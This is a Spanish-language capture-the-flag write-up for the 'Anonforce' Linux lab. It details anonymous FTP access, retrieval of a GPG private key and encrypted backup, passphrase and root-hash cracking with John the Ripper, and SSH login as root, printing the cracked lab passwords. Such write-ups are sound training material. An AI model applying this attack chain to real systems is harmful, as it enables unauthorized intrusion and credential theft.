# Anonforce

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux aprovechando el acceso mediante **FTP anónimo**, obteniendo una clave privada **GPG**, descifrando un backup cifrado, recuperando las credenciales del usuario **root** y accediendo al sistema mediante **SSH**.

---

## 🛠️ Tecnologías trabajadas

- FTP
- Anonymous Login
- GPG
- John The Ripper
- SSH
- Cracking de contraseñas
- Criptografía

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **FTP** y **SSH**. Al detectar que el servidor FTP permitía autenticación anónima, centré toda la investigación en dicho servicio, ya que representaba el vector de entrada más prometedor.

Durante la exploración del servidor FTP encontré varios archivos sensibles, entre ellos una clave privada GPG protegida por contraseña y un backup cifrado. En lugar de intentar acceder directamente al sistema mediante SSH, el objetivo pasó a ser recuperar la contraseña de la clave privada para descifrar el contenido del backup.

Tras crackear la passphrase de la clave GPG fue posible importar la clave y descifrar el backup, obteniendo el hash correspondiente al usuario **root**. Finalmente, tras crackear dicho hash con **John The Ripper**, conseguí las credenciales del administrador e inicié sesión directamente mediante SSH.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo con **ReconX**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |

Durante la enumeración se observó que el servicio FTP permitía autenticación anónima (**Anonymous Login Allowed**), convirtiéndose en el principal vector de entrada.

---

### 2. Enumeración FTP

Accedí al servidor FTP utilizando el usuario anónimo.

```bash
ftp anonymous@10.129.X.X
```

Una vez dentro encontré varios archivos interesantes.

Entre ellos destacaba:

```text
user.txt
```

Lo descargué.

```bash
get user.txt
```

Y consulté su contenido.

```bash
cat user.txt
```

Primera flag obtenida.

---

### 3. Descubrimiento de archivos sensibles

Durante la exploración del servidor encontré un directorio especialmente interesante.

```text
notread
```

Dentro del mismo aparecían dos archivos:

- `backup.pgp`
- `private.asc`

Los descargué para analizarlos localmente.

```bash
get backup.pgp
get private.asc
```

El archivo `private.asc` correspondía a una clave privada GPG protegida mediante contraseña.

---

### 4. Crackeo de la clave privada GPG

Convertí la clave privada al formato compatible con **John The Ripper**.

```bash
gpg2john private.asc > privatehash
```

Posteriormente lancé un ataque de diccionario.

```bash
john privatehash --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Contraseña: xbox360
```

Con la contraseña recuperada ya era posible importar la clave privada.

---

### 5. Descifrado del backup

Importé la clave GPG.

```bash
gpg --import private.asc
```

Después descifré el backup.

```bash
gpg --decrypt backup.pgp
```

El contenido descifrado reveló el hash correspondiente a la contraseña del usuario **root**.

---

### 6. Obtención de las credenciales de root

Guardé el hash en un archivo y utilicé nuevamente **John The Ripper**.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Usuario: root
Contraseña: hikari
```

Con ello ya disponía de las credenciales del administrador.

---

### 7. Acceso al sistema

Inicié sesión directamente mediante SSH.

```bash
ssh root@10.129.X.X
```

Introduje la contraseña obtenida.

```text
hikari
```

El acceso fue correcto y obtuve una shell como **root**.

Finalmente accedí al directorio del administrador.

```bash
cd /root
cat root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio mostró cómo una mala gestión de archivos sensibles puede comprometer completamente un sistema, incluso sin explotar vulnerabilidades complejas.
- Identificar el **FTP anónimo** como vector de entrada.
- Enumerar correctamente servidores FTP en busca de información sensible.
- Convertir claves privadas GPG al formato compatible con **John The Ripper**.
- Crackear passphrases de claves privadas GPG.
- Importar claves privadas mediante `gpg`.
- Descifrar archivos protegidos con **GPG**.
- Recuperar hashes desde backups cifrados.
- Crackear hashes utilizando **John The Ripper**.
- Acceder directamente como **root** mediante SSH utilizando credenciales recuperadas.
